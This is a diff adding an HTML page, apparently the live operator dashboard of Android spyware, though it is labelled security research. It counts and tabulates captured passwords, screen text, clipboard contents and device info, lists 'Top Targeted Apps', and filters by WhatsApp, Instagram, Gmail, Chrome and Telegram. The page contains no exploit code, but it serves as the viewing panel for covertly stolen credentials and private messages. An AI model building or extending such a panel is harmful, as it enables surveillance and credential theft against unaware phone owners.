@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Security Research - Live Dashboard</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔍 Android Security Research Dashboard</h1>
+            <div class="status">
+                <span id="status-badge" class="badge online">● Live</span>
+                <span id="last-update">Last update: just now</span>
+            </div>
+        </header>
+
+        <!-- Statistics Cards -->
+        <section class="stats">
+            <div class="stat-card">
+                <span class="stat-value" id="total-count">0</span>
+                <span class="stat-label">Total Captures</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-value" id="today-count">0</span>
+                <span class="stat-label">Today</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-value" id="password-count">0</span>
+                <span class="stat-label">Passwords</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-value" id="screen-count">0</span>
+                <span class="stat-label">Screen Texts</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-value" id="clipboard-count">0</span>
+                <span class="stat-label">Clipboard</span>
+            </div>
+        </section>
+
+        <!-- Top Apps -->
+        <section class="top-apps">
+            <h2>📱 Top Targeted Apps</h2>
+            <div id="app-breakdown" class="app-list"></div>
+        </section>
+
+        <!-- Filters & Search -->
+        <section class="filters">
+            <div class="filter-group">
+                <label>Filter by App:</label>
+                <select id="app-filter">
+                    <option value="">All Apps</option>
+                    <option value="com.whatsapp">WhatsApp</option>
+                    <option value="com.instagram.android">Instagram</option>
+                    <option value="com.google.android.gm">Gmail</option>
+                    <option value="com.android.chrome">Chrome</option>
+                    <option value="com.telegram">Telegram</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <label>Filter by Type:</label>
+                <select id="type-filter">
+                    <option value="">All Types</option>
+                    <option value="password">Password</option>
+                    <option value="clipboard">Clipboard</option>
+                    <option value="screen_text">Screen Text</option>
+                    <option value="device_info">Device Info</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <label>Search:</label>
+                <input type="text" id="search-input" placeholder="Search in data...">
+            </div>
+            <button id="refresh-btn" class="btn">⟳ Refresh</button>
+        </section>
+
+        <!-- Data Table -->
+        <section class="data-table-wrapper">
+            <table id="data-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Type</th>
+                        <th>App</th>
+                        <th>Data</th>
+                        <th>Device</th>
+                        <th>Captured At</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="table-body">
+                    <tr><td colspan="7" style="text-align:center; color: #888;">No data captured yet. Start the Android app!</td></tr>
+                </tbody>
+            </table>
+        </section>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/script.js"></script>
+</body>
+</html>
